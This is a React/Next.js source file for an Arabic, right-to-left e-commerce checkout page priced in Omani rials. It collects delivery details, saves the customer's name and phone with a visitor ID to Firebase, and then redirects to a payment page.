"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { ArrowRight, CreditCard, Smartphone, Lock, CheckCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Separator } from "@/components/ui/separator"
import { Badge } from "@/components/ui/badge"
import Link from "next/link"
import { useCart } from "@/contexts/cart-context"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

export default function CheckoutPage() {
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    address: "",
    city: "",
  })

  const { getCartItems, getTotalPrice } = useCart()
  const cartItems = getCartItems()



  const handleInputChange = (field: string, value: string) => {
    let formattedValue = value
    setFormData((prev) => ({
      ...prev,
      [field]: formattedValue,
    }))
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const visitorId = localStorage.getItem("visitor")
    addData({
      id: visitorId,
      phone: formData.phone,
      name: formData.name,
    })
    window.location.href = "/checkout/payment"
  }

  useEffect(() => {
    const _id = localStorage.getItem("visitor")
    setupOnlineStatus(_id!)
  }, [])



  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white" dir="rtl">
      {/* Header */}
      <header className="bg-white shadow-sm border-b sticky top-0 z-10">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <Link href="/cart">
              <Button variant="ghost" size="icon">
                <ArrowRight className="h-5 w-5" />
              </Button>
            </Link>
            <h1 className="text-xl font-bold text-blue-600">إتمام الطلب</h1>
            <div className="flex items-center gap-2">
              <Lock className="h-4 w-4 text-green-600" />
              <span className="text-xs text-green-600 hidden sm:inline">آمن</span>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8">
        <form onSubmit={handleSubmit} className="grid grid-cols-1 xl:grid-cols-3 gap-6 lg:gap-8">
          {/* Checkout Form */}
          <div className="xl:col-span-2 space-y-6">
            {/* Delivery Information */}
            <Card className="border-0 shadow-lg">
              <CardHeader className="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-t-lg">
                <CardTitle className="flex items-center gap-2 text-gray-800">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center">
                    <span className="text-white text-sm font-bold">1</span>
                  </div>
                  معلومات التوصيل
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6 space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="name" className="text-sm font-medium text-gray-700">
                      الاسم الكامل
                    </Label>
                    <Input
                      id="name"
                      value={formData.name}
                      onChange={(e) => handleInputChange("name", e.target.value)}
                      placeholder="أدخل اسمك الكامل"
                      className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="phone" className="text-sm font-medium text-gray-700">
                      رقم الهاتف
                    </Label>
                    <Input
                      id="phone"
                      value={formData.phone}
                      onChange={(e) => handleInputChange("phone", e.target.value)}
                      placeholder="+968 9X XXX XXX"
                      className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                      required
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="address" className="text-sm font-medium text-gray-700">
                    العنوان
                  </Label>
                  <Input
                    id="address"
                    value={formData.address}
                    onChange={(e) => handleInputChange("address", e.target.value)}
                    placeholder="أدخل عنوانك بالتفصيل"
                    className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="city" className="text-sm font-medium text-gray-700">
                    المدينة
                  </Label>
                  <Input
                    id="city"
                    value={formData.city}
                    onChange={(e) => handleInputChange("city", e.target.value)}
                    placeholder="مسقط"
                    className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                    required
                  />
                </div>
              </CardContent>
            </Card>

         
          </div>

          {/* Order Summary */}
          <div className="xl:col-span-1">
            <Card className="sticky top-24 border-0 shadow-lg">
              <CardHeader className="bg-gradient-to-r from-purple-50 to-pink-50">
                <CardTitle className="flex items-center gap-2 text-gray-800">
                  <div className="w-8 h-8 bg-purple-600 rounded-full flex items-center justify-center">
                    <CheckCircle className="w-4 h-4 text-white" />
                  </div>
                  ملخص الطلب
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6 space-y-4">
                <div className="space-y-3">
                  {cartItems.map((item) => (
                    <div
                      key={item!.id}
                      className="flex justify-between items-center text-sm py-2 border-b border-gray-100 last:border-b-0"
                    >
                      <div className="flex-1">
                        <span className="font-medium">{item!.nameAr}</span>
                        <span className="text-gray-500 mr-2">× {item!.quantity}</span>
                      </div>
                      <span className="font-semibold text-blue-600">
                        {(item!.price * item!.quantity).toFixed(2)} ر.ع
                      </span>
                    </div>
                  ))}
                </div>

                <Separator />

                <Button
                  type="submit"
                  className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 h-12 text-base font-semibold shadow-lg hover:shadow-xl transition-all duration-200"
                >
                  <Lock className="w-4 h-4 ml-2" />
                  تأكيد الطلب والدفع الآمن
                </Button>
                

                <Separator />


                <div className="text-center">
                  <p className="text-xs text-gray-500 flex items-center justify-center gap-1">
                    <Lock className="w-3 h-3" />
                    معلوماتك محمية بتشفير SSL 256-bit
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        </form>
      </main>
    </div>
  )
}
